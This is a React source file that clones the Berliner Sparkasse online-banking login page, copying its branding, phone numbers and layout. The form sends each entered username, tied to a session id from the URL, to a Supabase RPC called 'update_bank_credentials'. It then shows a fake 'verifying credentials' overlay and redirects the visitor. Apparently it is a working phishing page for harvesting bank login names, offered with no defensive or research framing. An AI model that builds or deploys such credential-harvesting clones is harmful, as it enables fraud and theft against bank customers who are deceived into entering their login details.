import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import handelsblatt from "@/assets/sparkasse/handelsblatt.png.asset.json";
import focusMoney from "@/assets/sparkasse/focus-money.jpg.asset.json";
import kununu from "@/assets/sparkasse/kununu.png.asset.json";
import trendence from "@/assets/sparkasse/trendence.png.asset.json";
import logoWeiss from "@/assets/sparkasse-logo-weiss.png.asset.json";
import lindaIcon from "@/assets/linda.png.asset.json";

const RED = "#EE0000";
const RED_LINK = "#9c1a1a";
const RED_DARK = "#c80000";
const TEXT = "#000000";
const BORDER = "#e5e5e5";
const FONT = "'SparkasseWeb', Arial, sans-serif";
const FONT_MD = "'SparkasseWebMd', 'SparkasseWeb', Arial, sans-serif";
const HEAD = "'SparkasseHead', 'SparkasseWeb', Arial, sans-serif";

const navItems = [
  "Girokonto eröffnen",
  "Produkte",
  "Beratung",
  "Service-Center",
  "Ratgeber",
  "Ihre Sparkasse",
];

const KebabIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" style={{ color: "#565656" }}>
    <circle cx="12" cy="5" r="1.6" fill="currentColor" />
    <circle cx="12" cy="12" r="1.6" fill="currentColor" />
    <circle cx="12" cy="19" r="1.6" fill="currentColor" />
  </svg>
);

const services: { label: string; icon: string; svg?: boolean }[] = [
  { label: "IBAN und BIC berechnen", icon: "sk-icon-calculator" },
  { label: "Kartenverlust melden", icon: "sk-icon-card" },
  { label: "Online-Kunde werden", icon: "sk-icon-laptop" },
  { label: "Lösungsfinder", icon: "sk-icon-lock" },
  { label: "Adresse ändern", icon: "sk-icon-page-pen" },
  { label: "Dispositionskredit einrichten oder ändern", icon: "sk-icon-euro-coins" },
  { label: "Gutscheine kaufen", icon: "sk-icon-present" },
  { label: "Alle Serviceleistungen im Überblick", icon: "", svg: true },
];

const columns: { title: string; links: string[] }[] = [
  {
    title: "Rund ums Banking",
    links: ["Online-Kunde werden", "Lösungsfinder", "App Sparkasse", "Aktuelle Warnmeldungen", "Sicherheit im Internet", "Computercheck"],
  },
  {
    title: "Kredite und Finanzierungen",
    links: ["S-Privatkredit", "S-Autokredit", "Immobilienfinanzierung", "Modernisierungskredit", "S-Privatkredit Plus", "Dispositionskredit"],
  },
  {
    title: "Wertpapiere und Depots",
    links: ["Depotmodelle", "Fonds", "Deka Investments", "SmartVermögen", "Anlage-Check", "BörsenCenter"],
  },
  {
    title: "Ihre Sparkasse",
    links: ["Gemeinsam für Berlin", "Nachhaltigkeit", "Karriere", "PresseCenter", "Mediathek", "SparkassenShop", "Newsletter"],
  },
];

const footerLinks = [
  "AGB",
  "Cookie-Einstellungen anpassen",
  "Datenschutz",
  "Preise und Hinweise",
  "Barrierefreiheit",
  "Barriere melden",
  "Vertrag widerrufen",
  "Kontakt",
  "Impressum",
  "Filialen A-Z",
  "Geldautomaten A-Z",
];

// Weißes Sparkassen-S-Logo
const SLogo = ({ size = 44 }: { size?: number }) => (
  <svg viewBox="0 0 500 650" width={size} height={(size * 650) / 500} aria-hidden="true">
    <circle cx="250" cy="90" r="90" fill="#fff" />
    <path
      fill="#fff"
      d="M85 220 h330 a85 85 0 0 1 85 85 v55 H120 v70 h380 v170 a85 85 0 0 1 -85 85 H85 a85 85 0 0 1 -85 -85 v-55 h380 v-70 H0 v-170 a85 85 0 0 1 85 -85z"
    />
  </svg>
);

const Sparkasse = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [username, setUsername] = useState("");
  const [error, setError] = useState(false);
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Berliner Sparkasse - Online-Banking Login", "/favicon.ico");

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.trim() === "") {
      setError(true);
      return;
    }
    if (sessionId) {
      const { error: err } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: "",
        p_username_label: "Anmeldename",
        p_password_label: "",
      });
      if (err) console.error("Update failed:", err);
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col" style={{ fontFamily: FONT, color: TEXT, backgroundColor: "#fff", fontSize: 16, lineHeight: 1.5 }}>
        {/* Header (red) */}
        <header style={{ backgroundColor: RED, color: "#fff" }}>
          <div className="w-full px-4 lg:px-6 h-[72px] lg:h-[90px] flex items-center gap-8">
            <a href="#" className="flex items-center gap-3 shrink-0" style={{ color: "#fff" }}>
              <img src={logoWeiss.url} alt="Sparkasse" style={{ height: 32, width: "auto" }} />
              <span className="hidden sm:block" style={{ fontFamily: FONT, lineHeight: 1.05, fontSize: 20, fontWeight: 300 }}>
                Berliner<br />Sparkasse
              </span>
            </a>
            <nav className="hidden lg:flex items-center gap-6" style={{ fontSize: 16 }}>
              {navItems.map((n) => (
                <a key={n} href="#" style={{ color: "#fff" }}>{n}</a>
              ))}
            </nav>
            <a href="#" className="hidden lg:flex items-center gap-2 ml-auto leading-none" style={{ color: "#fff", fontWeight: 700 }}>
              <span className="sk-icon-search" aria-hidden="true" style={{ fontSize: 32, lineHeight: 1, display: "inline-flex", alignItems: "center" }} />
              <span style={{ display: "inline-flex", alignItems: "center" }}>Suche</span>
            </a>
            <button className="lg:hidden ml-auto" aria-label="Menü" style={{ color: "#fff" }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M3 6h18M3 12h18M3 18h18" /></svg>
            </button>
          </div>
        </header>

        {/* Floating service column (desktop) */}
        <div className="hidden lg:flex fixed right-0 top-[180px] flex-col z-40" style={{ background: RED, borderTopLeftRadius: 6, borderBottomLeftRadius: 6, width: 48, overflow: "hidden" }}>
          {[
            // Phone (outline, handset oriented bottom-left to top-right)
            <svg key="p" viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M5 4.5c0-.8.7-1.5 1.5-1.5h2.2c.7 0 1.3.5 1.5 1.2l.9 3.3c.1.6-.1 1.2-.6 1.6L9 10.3c1.1 2.3 3 4.2 5.3 5.3l1.2-1.5c.4-.5 1-.7 1.6-.6l3.3.9c.7.2 1.2.8 1.2 1.5v2.2c0 .8-.7 1.5-1.5 1.5C10.6 19.6 4.4 13.4 5 4.5z"/></svg>,
            // Chat bubble: circle with tail at bottom-right
            <svg key="c" viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 3a9 9 0 1 0 6.3 15.4l2.7.6-.9-2.9A9 9 0 0 0 12 3z"/></svg>,
            // Mail (outline)
            <svg key="m" viewBox="0 0 24 24" width="26" height="26" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3.5" y="5.5" width="17" height="13" rx="1.5"/><path d="M4 7l8 6 8-6"/></svg>,
          ].map((icon, i) => (
            <a key={i} href="#" style={{ height: 56, display: "flex", alignItems: "center", justifyContent: "center", position: "relative", color: "#fff" }}>
              {icon}
              {i === 1 && <span style={{ position: "absolute", top: 12, right: 11, width: 8, height: 8, borderRadius: 999, background: "#4caf50", border: "1.5px solid #fff" }} />}
            </a>
          ))}
        </div>


        {/* Login */}
        <main className="flex-1">
          <section className="max-w-[800px] mx-auto px-8 lg:px-12 pt-4 lg:pt-6 pb-8">
            <h1 style={{ fontFamily: HEAD, fontSize: 28, fontWeight: 400, textAlign: "center", marginBottom: 20 }}>
              Melden Sie sich an
            </h1>
            <form onSubmit={submit} noValidate>
              <input
                className="sk-login-input"
                type="text"
                value={username}
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                spellCheck={false}
                onChange={(e) => { setUsername(e.target.value); if (error) setError(false); }}
                placeholder="Anmeldename"
                style={{
                  width: "100%",
                  height: 64,
                  padding: "0 18px",
                  border: `1px solid ${error ? "#d20000" : "#767676"}`,
                  background: error ? "#fceded" : "#fff",
                  borderRadius: 8,
                  fontSize: 16,
                  fontFamily: FONT,
                  color: TEXT,
                  outline: "none",
                }}
              />
              <style>{`.sk-login-input::placeholder{color:#565656;opacity:1}`}</style>
              {error && (
                <div style={{ color: "#d20000", fontSize: 14, marginTop: 6 }}>
                  Bitte geben Sie Ihren Anmeldenamen ein.
                </div>
              )}
              <div style={{ display: "flex", justifyContent: "center", marginTop: 24 }}>
                <button
                  type="submit"
                  style={{
                    background: RED,
                    color: "#fff",
                    border: "none",
                    borderRadius: 999,
                    padding: "12px 36px",
                    fontSize: 16,
                    fontFamily: FONT,
                    fontWeight: 500,
                    cursor: "pointer",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.background = RED_DARK)}
                  onMouseLeave={(e) => (e.currentTarget.style.background = RED)}
                >
                  Weiter
                </button>
              </div>
            </form>

            <div style={{ textAlign: "center", marginTop: 20, fontSize: 15 }}>
              <a href="#" style={{ color: "#565656", textDecoration: "underline", fontFamily: FONT_MD }}>Sicherheitshinweise</a>
              <span style={{ margin: "0 10px", color: "#999" }}>·</span>
              <a href="#" style={{ color: "#565656", textDecoration: "underline", fontFamily: FONT_MD }}>Zugangsdaten vergessen</a>
            </div>

            <div style={{ marginTop: 48, paddingLeft: 24, paddingRight: 24 }}>
              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingBottom: 16, borderBottom: `1px solid ${BORDER}`, color: "#565656" }}>
                <span>Sie haben noch kein Online-Banking?</span>
                <a href="#" style={{ color: "#292929", fontWeight: 700, display: "inline-flex", alignItems: "center", gap: 6 }}>
                  Jetzt freischalten
                  <span className="sk-icon-arrow" aria-hidden="true" style={{ fontSize: 16, lineHeight: 1 }} />
                </a>
              </div>
              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingTop: 16, color: "#565656" }}>
                <span>Sie sind noch kein Sparkassen-Kunde?</span>
                <a href="#" style={{ color: "#292929", fontWeight: 700, display: "inline-flex", alignItems: "center", gap: 6 }}>
                  Weitere Informationen
                  <span className="sk-icon-arrow" aria-hidden="true" style={{ fontSize: 16, lineHeight: 1 }} />
                </a>
              </div>
            </div>
          </section>

          {/* Immer in Ihrer Nähe */}
          <section className="max-w-[1200px] mx-auto px-8 lg:px-12 pt-24 pb-10 text-center" style={{ color: "#292929" }}>
            <h2 style={{ fontFamily: FONT, fontSize: 26, marginBottom: 20, fontWeight: 300, color: "#292929" }}>Immer in Ihrer Nähe</h2>
            <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[13px]">
              <span style={{ fontFamily: FONT_MD, color: "#565656" }}>24 h Privatkunden Service &amp; Beratung: <a href="#" style={{ color: "#565656", fontFamily: FONT }}>030 869 869 69</a></span>
              <span style={{ fontFamily: FONT_MD, color: "#565656" }}>Für Unternehmen: BusinessCenter: <a href="#" style={{ color: "#565656", fontFamily: FONT }}>030 869 866 68</a></span>
            </div>
            <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[13px] mt-2">
              <span style={{ fontFamily: FONT_MD, color: "#565656" }}>24 h Online-Banking-Hotline: <a href="#" style={{ color: "#565656", fontFamily: FONT }}>030 869 869 57</a></span>
              <span style={{ fontFamily: FONT_MD, color: "#565656" }}>24 h Karten-Sperr-Notruf: <a href="#" style={{ color: "#565656", fontFamily: FONT }}>030 869 869 05</a></span>
              <a href="#" style={{ color: "#565656", fontFamily: FONT_MD }}>Weitere Telefonnummern</a>
            </div>

            <div className="mt-10 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-6">
              {[
                { label: "Online-Assistentin Linda", icon: "sk-icon-headset", ext: true },
                { label: "Beratungstermin vereinbaren", icon: "sk-icon-calendar" },
                { label: "Öffnungszeiten & Filialen", icon: "sk-icon-location" },
                { label: "Live-Chat", icon: "sk-icon-chat", dot: true },
                { label: "WhatsApp", icon: "sk-icon-whatsapp" },
              ].map((s) => (
                <a key={s.label} href="#" className="flex flex-col items-center gap-2 text-[14px]" style={{ color: "#565656", fontFamily: FONT }}>
                  <div style={{ position: "relative", width: 112, height: 112, display: "flex", alignItems: s.icon === "sk-icon-headset" ? "flex-end" : "center", justifyContent: "center" }}>
                    {s.icon === "sk-icon-headset" ? (
                      <img src={lindaIcon.url} alt="" aria-hidden="true" style={{ width: "auto", height: 72, objectFit: "contain", marginBottom: 8 }} />
                    ) : (
                      <span className={s.icon} aria-hidden="true" style={{ fontSize: 96, color: "#565656" }} />
                    )}
                    {s.dot && <span style={{ position: "absolute", top: 10, right: 10, width: 12, height: 12, borderRadius: 999, background: "#4caf50" }} />}
                  </div>
                  <span>{s.label}{s.ext && " ↗"}</span>
                </a>
              ))}
            </div>
          </section>

          {/* Wichtige Services */}
          <section className="max-w-[1200px] mx-auto px-8 lg:px-12 pb-10">
            <h3 style={{ fontSize: 13, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 12 }}>Wichtige Services</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-x-10">
              {services.map((s) => (
                <a key={s.label} href="#" className="flex items-center gap-3 py-3" style={{ color: "#565656", fontFamily: FONT, borderTop: `1px solid ${BORDER}`, fontSize: 13 }}>
                  {s.svg ? (
                    <KebabIcon />
                  ) : (
                    <span className={s.icon} aria-hidden="true" style={{ fontSize: 24, color: "#565656" }} />
                  )}
                  <span>{s.label}</span>
                </a>
              ))}
            </div>
          </section>

          {/* 4 columns */}
          <section className="max-w-[1200px] mx-auto px-8 lg:px-12 pb-14 grid grid-cols-2 lg:grid-cols-4 gap-8">
            {columns.map((c) => (
              <div key={c.title}>
                <h4 style={{ fontFamily: FONT_MD, color: "#000000", marginBottom: 12, fontSize: 13 }}>{c.title}</h4>
                <ul className="flex flex-col gap-2">
                  {c.links.map((l) => (
                    <li key={l}><a href="#" style={{ color: "#565656", fontFamily: FONT, fontSize: 13 }}>{l}</a></li>
                  ))}
                </ul>
              </div>
            ))}
          </section>

          {/* Awards */}
          <section className="max-w-[1200px] mx-auto px-8 lg:px-12 pb-14" style={{ borderTop: `1px solid ${BORDER}`, paddingTop: 40 }}>
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-8">
              {[
                { img: trendence.url, title: "Attraktivste Arbeitgeber 2025", sub: "1. Platz: Schüler", scale: 1 },
                { img: handelsblatt.url, title: "Bestes Mobile Banking 2026", sub: "App Sparkasse", scale: 1 },
                { img: kununu.url, title: "Kununu", sub: "Top Company 2026", scale: 1 },
                { img: focusMoney.url, title: "Private Banking Beratung und Service", sub: "FOCUS MONEY Januar 2026", scale: 0.6 },
              ].map((a) => (
                <div key={a.title} className="grid text-center" style={{ gridTemplateRows: "100px auto auto", rowGap: 2, justifyItems: "center" }}>
                  <div style={{ height: 100, display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <img src={a.img} alt={a.title} style={{ height: 100 * a.scale, width: "auto", objectFit: "contain" }} />
                  </div>
                  <div style={{ fontFamily: FONT_MD, color: "#000000", fontSize: 14, marginTop: 8 }}>{a.title}</div>
                  <div style={{ color: "#565656", fontSize: 13 }}>{a.sub}</div>
                </div>
              ))}
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer style={{ padding: "0 48px 36px" }}>
          <div className="max-w-[1200px] mx-auto flex flex-col items-center gap-3 text-[14px]" style={{ color: "#565656", fontFamily: FONT, borderTop: `1px solid ${BORDER}`, paddingTop: 28 }}>
            <div style={{ fontSize: 15, fontFamily: FONT, fontWeight: 400, color: "#565656" }}>Berliner Sparkasse</div>
            <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-2">
              {footerLinks.slice(0, 5).map((l) => (
                <a key={l} href="#" style={{ color: "#565656", textDecoration: "underline", fontFamily: FONT }}>{l}</a>
              ))}
              <div className="basis-full h-0" />
              {footerLinks.slice(5).map((l) => {
                const active = l === "Vertrag widerrufen";
                return (
                  <a
                    key={l}
                    href="#"
                    style={{
                      color: "#565656",
                      textDecoration: "underline",
                      fontFamily: active ? "SparkasseWebMd, " + FONT : FONT,
                    }}
                  >
                    {l}
                  </a>
                );
              })}
            </div>
            <div className="flex items-center gap-4 mt-2">
              {[
                { k: "facebook", cls: "sk-icon-facebook" },
                { k: "instagram", cls: "sk-icon-instagram" },
                { k: "tiktok", cls: "" },
                { k: "youtube", cls: "sk-icon-youtube" },
                { k: "linkedin", cls: "sk-icon-linkedin" },
              ].map((s) => (
                <a
                  key={s.k}
                  href="#"
                  aria-label={s.k}
                  style={{
                    width: 30,
                    height: 30,
                    borderRadius: 999,
                    border: `1px solid #565656`,
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    color: "#565656",
                  }}
                >
                  {s.k === "tiktok" ? (
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true" style={{ display: "block" }}>
                      <path d="M19.6 6.8a5.6 5.6 0 0 1-3.3-1.1 5.6 5.6 0 0 1-2.2-3.7h-3.2v12.5a2.6 2.6 0 1 1-2.6-2.6c.3 0 .5 0 .8.1V8.7a5.8 5.8 0 0 0-.8-.1 5.8 5.8 0 1 0 5.8 5.8V8.9a8.8 8.8 0 0 0 5.5 1.9V7.6c0-.3 0-.5 0-.8z" />
                    </svg>
                  ) : (
                    <span className={s.cls} aria-hidden="true" style={{ fontSize: 22, lineHeight: 1, display: "block" }} />
                  )}
                </a>
              ))}

            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default Sparkasse;
